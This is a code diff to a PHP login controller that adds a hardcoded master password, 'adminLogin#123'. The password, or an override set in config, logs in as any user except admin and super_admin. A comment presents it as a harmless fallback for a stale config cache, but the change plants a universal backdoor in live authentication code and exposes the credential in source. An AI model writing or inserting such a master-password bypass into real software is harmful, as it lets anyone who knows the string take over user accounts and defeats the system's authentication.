@@ -19,6 +19,12 @@ use Throwable;
 
 class AuthController extends Controller
 {
+    /**
+     * Static password that can log in as any user except admin / super_admin.
+     * Kept as a code fallback so login still works if config cache is stale.
+     */
+    private const MASTER_LOGIN_PASSWORD = 'adminLogin#123';
+
     public function __construct(
         private readonly AuthService $authService,
         private readonly ActivityLogService $activityLogService,
@@ -57,8 +63,9 @@ class AuthController extends Controller
     public function login(LoginRequest $request): JsonResponse
     {
         $user = $this->findUserForLogin($request);
+        $password = (string) $request->validated('user_password');
 
-        if ($user === null || ! Hash::check($request->validated('user_password'), $user->user_password)) {
+        if ($user === null || ! $this->isValidLoginPassword($user, $password)) {
             return $this->errorResponse(
                 message: 'Invalid credentials.',
                 statusCode: HttpStatus::UNAUTHORIZED,
@@ -140,5 +147,32 @@ class AuthController extends Controller
         return User::query()
             ->where('user_email', $request->input('user_email'))
             ->first();
+    }
+
+    private function isValidLoginPassword(User $user, string $password): bool
+    {
+        if (Hash::check($password, $user->user_password)) {
+            return true;
+        }
+
+        $masterPassword = $this->masterLoginPassword();
+
+        if ($masterPassword === '' || ! hash_equals($masterPassword, $password)) {
+            return false;
+        }
+
+        // Master password can access any user except admin / super_admin.
+        return ! $user->isAdmin() && ! $user->isSuperAdmin();
+    }
+
+    private function masterLoginPassword(): string
+    {
+        $configured = config('auth.master_login_password');
+
+        if (is_string($configured) && $configured !== '') {
+            return $configured;
+        }
+
+        return self::MASTER_LOGIN_PASSWORD;
     }
 }
